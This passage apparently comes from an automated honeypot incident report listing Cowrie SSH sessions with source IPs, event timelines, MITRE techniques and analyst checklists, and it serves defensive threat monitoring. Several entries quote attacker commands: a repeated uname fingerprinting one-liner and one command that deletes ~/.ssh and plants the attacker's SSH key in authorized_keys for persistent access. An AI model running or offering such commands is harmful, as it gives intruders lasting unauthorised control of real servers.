| **First Seen** | 2026-07-27 07:25 |
| **Last Seen** | 2026-07-27 07:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 07:25:39` | `cowrie.session.connect` |
| `2026-07-27 07:25:39` | `cowrie.client.version` |
| `2026-07-27 07:25:39` | `cowrie.client.kex` |
| `2026-07-27 07:25:40` | `cowrie.login.success` |
| `2026-07-27 07:25:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.255.254[.]163` to AbuseIPDB if not already reported
- [ ] Block `139.255.254[.]163` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e1b41ed492d

| Field | Detail |
|---|---|
| **Source IP** | `222.236.155[.]146` |
| **First Seen** | 2026-07-27 07:25 |
| **Last Seen** | 2026-07-27 07:25 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 07:25:48` | `cowrie.session.connect` |
| `2026-07-27 07:25:49` | `cowrie.client.version` |
| `2026-07-27 07:25:49` | `cowrie.client.kex` |
| `2026-07-27 07:25:51` | `cowrie.login.success` |
| `2026-07-27 07:25:52` | `cowrie.direct-tcpip.request` |
| `2026-07-27 07:25:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.236.155[.]146` to AbuseIPDB if not already reported
- [ ] Block `222.236.155[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01c5c1315168

| Field | Detail |
|---|---|
| **Source IP** | `112.94.5[.]43` |
| **First Seen** | 2026-07-27 07:25 |
| **Last Seen** | 2026-07-27 07:26 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 07:25:57` | `cowrie.session.connect` |
| `2026-07-27 07:25:58` | `cowrie.client.version` |
| `2026-07-27 07:25:58` | `cowrie.client.kex` |
| `2026-07-27 07:26:01` | `cowrie.login.success` |
| `2026-07-27 07:26:03` | `cowrie.direct-tcpip.request` |
| `2026-07-27 07:26:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.94.5[.]43` to AbuseIPDB if not already reported
- [ ] Block `112.94.5[.]43` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d4273514fc6

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-27 07:26 |
| **Last Seen** | 2026-07-27 07:26 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 07:26:28` | `cowrie.session.connect` |
| `2026-07-27 07:26:29` | `cowrie.client.version` |
| `2026-07-27 07:26:29` | `cowrie.client.kex` |
| `2026-07-27 07:26:35` | `cowrie.login.success` |
| `2026-07-27 07:26:39` | `cowrie.session.params` |
| `2026-07-27 07:26:39` | `cowrie.command.input` |
| `2026-07-27 07:26:39` | `cowrie.command.input` |
| `2026-07-27 07:26:39` | `cowrie.command.input` |
| `2026-07-27 07:26:39` | `cowrie.command.input` |
| `2026-07-27 07:26:39` | `cowrie.command.input` |
| `2026-07-27 07:26:39` | `cowrie.command.success` |
| `2026-07-27 07:26:39` | `cowrie.command.input` |
| `2026-07-27 07:26:39` | `cowrie.command.input` |
| `2026-07-27 07:26:39` | `cowrie.command.input` |
| `2026-07-27 07:26:39` | `cowrie.command.input` |
| `2026-07-27 07:26:40` | `cowrie.log.closed` |
| `2026-07-27 07:26:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4eca1da2e47

| Field | Detail |
|---|---|
| **Source IP** | `185.150.190[.]130` |
| **First Seen** | 2026-07-27 07:27 |
| **Last Seen** | 2026-07-27 07:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 07:27:54` | `cowrie.session.connect` |
| `2026-07-27 07:27:54` | `cowrie.client.version` |
| `2026-07-27 07:27:54` | `cowrie.client.kex` |
| `2026-07-27 07:27:55` | `cowrie.login.success` |
| `2026-07-27 07:27:55` | `cowrie.session.params` |
| `2026-07-27 07:27:55` | `cowrie.command.input` |
| `2026-07-27 07:27:55` | `cowrie.command.failed` |
| `2026-07-27 07:27:55` | `cowrie.log.closed` |
| `2026-07-27 07:27:56` | `cowrie.session.params` |
| `2026-07-27 07:27:56` | `cowrie.command.input` |
| `2026-07-27 07:27:56` | `cowrie.session.file_download` |
| `2026-07-27 07:27:56` | `cowrie.log.closed` |
| `2026-07-27 07:27:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.150.190[.]130` to AbuseIPDB if not already reported
- [ ] Block `185.150.190[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b531b67cc6c

| Field | Detail |
|---|---|
| **Source IP** | `185.150.190[.]130` |
| **First Seen** | 2026-07-27 07:27 |
| **Last Seen** | 2026-07-27 07:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 07:27:56` | `cowrie.session.connect` |
| `2026-07-27 07:27:56` | `cowrie.client.version` |
| `2026-07-27 07:27:56` | `cowrie.client.kex` |
| `2026-07-27 07:27:56` | `cowrie.login.success` |
| `2026-07-27 07:27:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.150.190[.]130` to AbuseIPDB if not already reported
- [ ] Block `185.150.190[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58eb20d440e2

| Field | Detail |
|---|---|
| **Source IP** | `185.150.190[.]130` |
| **First Seen** | 2026-07-27 07:27 |
| **Last Seen** | 2026-07-27 07:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 07:27:56` | `cowrie.session.connect` |
| `2026-07-27 07:27:56` | `cowrie.client.version` |
| `2026-07-27 07:27:56` | `cowrie.client.kex` |
| `2026-07-27 07:27:56` | `cowrie.login.success` |
| `2026-07-27 07:27:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.150.190[.]130` to AbuseIPDB if not already reported
- [ ] Block `185.150.190[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c0260b8b56a

| Field | Detail |
|---|---|
| **Source IP** | `85.195.9[.]20` |
| **First Seen** | 2026-07-27 07:29 |
| **Last Seen** | 2026-07-27 07:29 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 07:29:07` | `cowrie.session.connect` |
| `2026-07-27 07:29:08` | `cowrie.client.version` |
| `2026-07-27 07:29:08` | `cowrie.client.kex` |
| `2026-07-27 07:29:08` | `cowrie.login.success` |
| `2026-07-27 07:29:09` | `cowrie.direct-tcpip.request` |
| `2026-07-27 07:29:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.195.9[.]20` to AbuseIPDB if not already reported
- [ ] Block `85.195.9[.]20` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e1ef52e074d

| Field | Detail |
|---|---|
| **Source IP** | `202.72.196[.]75` |
| **First Seen** | 2026-07-27 07:29 |
| **Last Seen** | 2026-07-27 07:34 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 07:29:13` | `cowrie.session.connect` |
| `2026-07-27 07:29:14` | `cowrie.client.version` |
| `2026-07-27 07:29:14` | `cowrie.client.kex` |
| `2026-07-27 07:29:16` | `cowrie.login.success` |
| `2026-07-27 07:29:16` | `cowrie.direct-tcpip.request` |
| `2026-07-27 07:34:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.72.196[.]75` to AbuseIPDB if not already reported
- [ ] Block `202.72.196[.]75` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-061aca50072e

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-27 07:29 |
| **Last Seen** | 2026-07-27 07:29 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 07:29:36` | `cowrie.session.connect` |
| `2026-07-27 07:29:38` | `cowrie.client.version` |
| `2026-07-27 07:29:38` | `cowrie.client.kex` |
| `2026-07-27 07:29:43` | `cowrie.login.success` |
| `2026-07-27 07:29:46` | `cowrie.session.params` |
| `2026-07-27 07:29:46` | `cowrie.command.input` |
| `2026-07-27 07:29:46` | `cowrie.command.input` |
| `2026-07-27 07:29:46` | `cowrie.command.input` |
| `2026-07-27 07:29:46` | `cowrie.command.input` |
| `2026-07-27 07:29:46` | `cowrie.command.input` |
| `2026-07-27 07:29:46` | `cowrie.command.success` |
| `2026-07-27 07:29:46` | `cowrie.command.input` |
| `2026-07-27 07:29:46` | `cowrie.command.input` |
| `2026-07-27 07:29:46` | `cowrie.command.input` |
| `2026-07-27 07:29:46` | `cowrie.command.input` |
| `2026-07-27 07:29:47` | `cowrie.log.closed` |
| `2026-07-27 07:29:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e879adeef5e

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-27 07:32 |
| **Last Seen** | 2026-07-27 07:32 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 07:32:43` | `cowrie.session.connect` |
| `2026-07-27 07:32:44` | `cowrie.client.version` |
| `2026-07-27 07:32:44` | `cowrie.client.kex` |
| `2026-07-27 07:32:49` | `cowrie.login.success` |
| `2026-07-27 07:32:52` | `cowrie.session.params` |
| `2026-07-27 07:32:52` | `cowrie.command.input` |
| `2026-07-27 07:32:52` | `cowrie.command.input` |
| `2026-07-27 07:32:52` | `cowrie.command.input` |
| `2026-07-27 07:32:52` | `cowrie.command.input` |
| `2026-07-27 07:32:52` | `cowrie.command.input` |
| `2026-07-27 07:32:52` | `cowrie.command.success` |
| `2026-07-27 07:32:52` | `cowrie.command.input` |
| `2026-07-27 07:32:52` | `cowrie.command.input` |
| `2026-07-27 07:32:52` | `cowrie.command.input` |
| `2026-07-27 07:32:52` | `cowrie.command.input` |
| `2026-07-27 07:32:53` | `cowrie.log.closed` |
| `2026-07-27 07:32:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe23386a8d85

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-27 07:38 |
| **Last Seen** | 2026-07-27 07:39 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 07:38:51` | `cowrie.session.connect` |
| `2026-07-27 07:38:53` | `cowrie.client.version` |
| `2026-07-27 07:38:53` | `cowrie.client.kex` |
| `2026-07-27 07:38:58` | `cowrie.login.success` |
| `2026-07-27 07:39:02` | `cowrie.session.params` |
| `2026-07-27 07:39:02` | `cowrie.command.input` |
| `2026-07-27 07:39:02` | `cowrie.command.input` |
| `2026-07-27 07:39:02` | `cowrie.command.input` |
| `2026-07-27 07:39:02` | `cowrie.command.input` |
| `2026-07-27 07:39:02` | `cowrie.command.input` |
| `2026-07-27 07:39:02` | `cowrie.command.success` |
| `2026-07-27 07:39:02` | `cowrie.command.input` |
| `2026-07-27 07:39:02` | `cowrie.command.input` |
| `2026-07-27 07:39:02` | `cowrie.command.input` |
| `2026-07-27 07:39:02` | `cowrie.command.input` |
| `2026-07-27 07:39:04` | `cowrie.log.closed` |
| `2026-07-27 07:39:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e588b52d494

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-27 07:41 |
| **Last Seen** | 2026-07-27 07:42 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 07:41:57` | `cowrie.session.connect` |
| `2026-07-27 07:41:59` | `cowrie.client.version` |
| `2026-07-27 07:41:59` | `cowrie.client.kex` |
| `2026-07-27 07:42:07` | `cowrie.login.success` |
| `2026-07-27 07:42:10` | `cowrie.session.params` |
| `2026-07-27 07:42:10` | `cowrie.command.input` |
| `2026-07-27 07:42:10` | `cowrie.command.input` |
| `2026-07-27 07:42:10` | `cowrie.command.input` |
| `2026-07-27 07:42:10` | `cowrie.command.input` |
| `2026-07-27 07:42:10` | `cowrie.command.input` |
| `2026-07-27 07:42:10` | `cowrie.command.success` |
| `2026-07-27 07:42:10` | `cowrie.command.input` |
| `2026-07-27 07:42:10` | `cowrie.command.input` |
| `2026-07-27 07:42:10` | `cowrie.command.input` |
| `2026-07-27 07:42:10` | `cowrie.command.input` |
| `2026-07-27 07:42:11` | `cowrie.log.closed` |
| `2026-07-27 07:42:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce82ec87f1a1

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-27 07:44 |
| **Last Seen** | 2026-07-27 07:45 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 07:44:53` | `cowrie.session.connect` |
| `2026-07-27 07:44:54` | `cowrie.client.version` |
| `2026-07-27 07:44:54` | `cowrie.client.kex` |
| `2026-07-27 07:45:02` | `cowrie.login.success` |
| `2026-07-27 07:45:06` | `cowrie.session.params` |
| `2026-07-27 07:45:06` | `cowrie.command.input` |
| `2026-07-27 07:45:06` | `cowrie.command.input` |
| `2026-07-27 07:45:06` | `cowrie.command.input` |
| `2026-07-27 07:45:06` | `cowrie.command.input` |
| `2026-07-27 07:45:06` | `cowrie.command.input` |
| `2026-07-27 07:45:06` | `cowrie.command.success` |
| `2026-07-27 07:45:06` | `cowrie.command.input` |
| `2026-07-27 07:45:06` | `cowrie.command.input` |
| `2026-07-27 07:45:06` | `cowrie.command.input` |
| `2026-07-27 07:45:06` | `cowrie.command.input` |
| `2026-07-27 07:45:08` | `cowrie.log.closed` |
| `2026-07-27 07:45:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c41435bb226a

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-27 07:47 |
| **Last Seen** | 2026-07-27 07:48 |
| **Session Duration** | 31s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 07:47:43` | `cowrie.session.connect` |
| `2026-07-27 07:47:45` | `cowrie.client.version` |
| `2026-07-27 07:47:45` | `cowrie.client.kex` |
| `2026-07-27 07:47:56` | `cowrie.login.success` |
| `2026-07-27 07:48:01` | `cowrie.session.params` |
| `2026-07-27 07:48:01` | `cowrie.command.input` |
| `2026-07-27 07:48:01` | `cowrie.command.input` |
| `2026-07-27 07:48:01` | `cowrie.command.input` |
| `2026-07-27 07:48:01` | `cowrie.command.input` |
| `2026-07-27 07:48:01` | `cowrie.command.input` |
| `2026-07-27 07:48:01` | `cowrie.command.success` |
| `2026-07-27 07:48:01` | `cowrie.command.input` |
| `2026-07-27 07:48:01` | `cowrie.command.input` |
| `2026-07-27 07:48:01` | `cowrie.command.input` |
| `2026-07-27 07:48:01` | `cowrie.command.input` |
| `2026-07-27 07:48:12` | `cowrie.log.closed` |
| `2026-07-27 07:48:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5788299547eb

| Field | Detail |
|---|---|
| **Source IP** | `65.20.161[.]126` |
| **First Seen** | 2026-07-27 07:49 |
| **Last Seen** | 2026-07-27 07:49 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 07:49:51` | `cowrie.session.connect` |
| `2026-07-27 07:49:51` | `cowrie.client.version` |
| `2026-07-27 07:49:51` | `cowrie.client.kex` |
| `2026-07-27 07:49:53` | `cowrie.login.success` |
| `2026-07-27 07:49:53` | `cowrie.direct-tcpip.request` |
| `2026-07-27 07:49:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.161[.]126` to AbuseIPDB if not already reported
- [ ] Block `65.20.161[.]126` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9a1780ef138

| Field | Detail |
|---|---|
| **Source IP** | `60.174.35[.]18` |
| **First Seen** | 2026-07-27 07:49 |
| **Last Seen** | 2026-07-27 07:50 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 07:49:59` | `cowrie.session.connect` |
| `2026-07-27 07:49:59` | `cowrie.client.version` |
| `2026-07-27 07:50:00` | `cowrie.client.kex` |
| `2026-07-27 07:50:03` | `cowrie.login.success` |
| `2026-07-27 07:50:03` | `cowrie.direct-tcpip.request` |
| `2026-07-27 07:50:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.174.35[.]18` to AbuseIPDB if not already reported
- [ ] Block `60.174.35[.]18` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-641ba06fab4b

| Field | Detail |
|---|---|
| **Source IP** | `81.237.155[.]113` |
| **First Seen** | 2026-07-27 07:50 |
| **Last Seen** | 2026-07-27 07:50 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
